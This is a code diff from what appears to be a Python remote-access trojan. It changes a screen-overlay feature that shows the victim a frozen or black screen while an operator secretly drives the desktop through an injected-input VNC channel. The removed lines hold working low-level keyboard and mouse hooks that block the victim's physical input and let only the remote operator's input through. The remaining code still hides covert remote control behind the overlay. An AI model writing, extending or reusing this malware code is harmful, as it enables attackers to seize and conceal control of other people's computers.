@@ -1017,11 +1017,12 @@ def _overlay_run(black: bool) -> None:
     if not u32.RegisterClassW(ctypes.byref(wc)):
         if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
             return
-    # click-through: WS_EX_TRANSPARENT|WS_EX_LAYERED lets hit-testing fall
-    # through to the windows beneath, so netvnc's injected SendInput reaches
-    # the REAL desktop; physical victim input is blocked by the LL hook in
-    # _input_block_start() (injected events carry LLMHF/LLKHF_INJECTED and
-    # pass through it).
+    # click-through: WS_EX_TRANSPARENT|WS_EX_LAYERED makes the overlay
+    # invisible to hit-testing, so ALL input - the victim's physical
+    # mouse/keyboard and netvnc's injected SendInput alike - reaches the
+    # windows beneath. The overlay never takes focus and blocks nothing;
+    # the victim's cursor is drawn into the composite stream (under layer)
+    # via GetCursorInfo/DrawIconEx, never over the overlay itself.
     hwnd = u32.CreateWindowExW(0x8 | 0x80 | 0x20 | 0x80000, cls, "",
                                0x80000000,               # WS_POPUP
                                0, 0, w, h, None, None, None, None)
@@ -1029,91 +1030,13 @@ def _overlay_run(black: bool) -> None:
         return
     state["hwnd"] = hwnd
     u32.SetLayeredWindowAttributes(hwnd, 0, 255, 2)   # LWA_ALPHA opaque
-    u32.ShowWindow(hwnd, 5)               # SW_SHOW
-    u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0040)   # HWND_TOPMOST-ish
+    u32.ShowWindow(hwnd, 8)               # SW_SHOWNA - never takes focus
+    u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0050)   # SWP_NOACTIVATE|SWP_SHOWWINDOW
     m = MSG()
     while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
         u32.TranslateMessage(ctypes.byref(m))
         u32.DispatchMessageW(ctypes.byref(m))
     state["hwnd"] = None
-
-
-def _input_block_start():
-    """Block PHYSICAL keyboard/mouse while the overlay is up (no admin
-    needed). Injected input (SendInput, e.g. netvnc remote control) sets
-    LLMHF_INJECTED / LLKHF_INJECTED and passes straight through."""
-    if os.name != "nt":
-        return
-    import ctypes
-    from ctypes import wintypes
-    u32 = ctypes.windll.user32
-    k32 = ctypes.windll.kernel32
-
-    class KBDLLHOOKSTRUCT(ctypes.Structure):
-        _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
-                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
-                    ("dwExtraInfo", ctypes.c_size_t)]
-
-    class MSLLHOOKSTRUCT(ctypes.Structure):
-        _fields_ = [("pt", wintypes.POINT), ("mouseData", wintypes.DWORD),
-                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
-                    ("dwExtraInfo", ctypes.c_size_t)]
-
-    class MSG(ctypes.Structure):
-        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
-                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
-                    ("time", ctypes.c_uint), ("pt", wintypes.POINT)]
-
-    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
-                                  wintypes.WPARAM, wintypes.LPARAM)
-    INJECTED = 0x10
-
-    def kb_proc(code, wp, lp):
-        if code >= 0:
-            st = ctypes.cast(lp, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
-            if not (st.flags & INJECTED):
-                return 1
-        return u32.CallNextHookEx(None, code, wp, lp)
-
-    def ms_proc(code, wp, lp):
-        if code >= 0:
-            st = ctypes.cast(lp, ctypes.POINTER(MSLLHOOKSTRUCT)).contents
-            if not (st.flags & INJECTED):
-                return 1
-        return u32.CallNextHookEx(None, code, wp, lp)
-
-    kb_cb, ms_cb = HOOKPROC(kb_proc), HOOKPROC(ms_proc)
-    _ov_state["hook_cbs"] = (kb_cb, ms_cb)   # keep trampolines alive
-
-    def pump():
-        kb = u32.SetWindowsHookExW(13, kb_cb, None, 0)   # WH_KEYBOARD_LL
-        ms = u32.SetWindowsHookExW(14, ms_cb, None, 0)   # WH_MOUSE_LL
-        _ov_state["hooks"] = (kb, ms)
-        m = MSG()
-        while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
-            pass
-        for hh in (kb, ms):
-            if hh:
-                u32.UnhookWindowsHookEx(hh)
-        _ov_state["hooks"] = None
-
-    th = threading.Thread(target=pump, daemon=True, name="ovblock")
-    _ov_state["hook_thread"] = th
-    th.start()
-
-
-def _input_block_stop():
-    if os.name != "nt":
-        return
-    import ctypes
-    t = _ov_state.get("hook_thread")
-    if t and t.is_alive():
-        if t.ident:
-            ctypes.windll.user32.PostThreadMessageW(t.ident, 0x0012, 0, 0)
-        t.join(timeout=3)
-    _ov_state["hook_thread"] = None
-    _ov_state["hooks"] = None
-    _ov_state["hook_cbs"] = None
 
 
 def _overlay_on(black: bool = False) -> str:
@@ -1137,9 +1060,8 @@ def _overlay_on(black: bool = False) -> str:
         time.sleep(0.05)
     if _ov_state["hwnd"]:
         _ov_state["black"] = black
-        _input_block_start()
         kind = "solid black" if black else "screen frozen"
-        return "[+] overlay on (%s, physical input blocked, remote control live)" % kind
+        return "[+] overlay on (%s, click-through: local and remote input reach the desktop)" % kind
     return "[!] overlay failed to create window"
 
 
@@ -1153,7 +1075,6 @@ def _overlay_off() -> str:
         ctypes.windll.user32.PostMessageW(hwnd, 0x10, 0, 0)   # WM_CLOSE
     if t:
         t.join(timeout=5)
-    _input_block_stop()
     _ov_state["bits"] = None
     return "[+] overlay off (screen live again)"
 
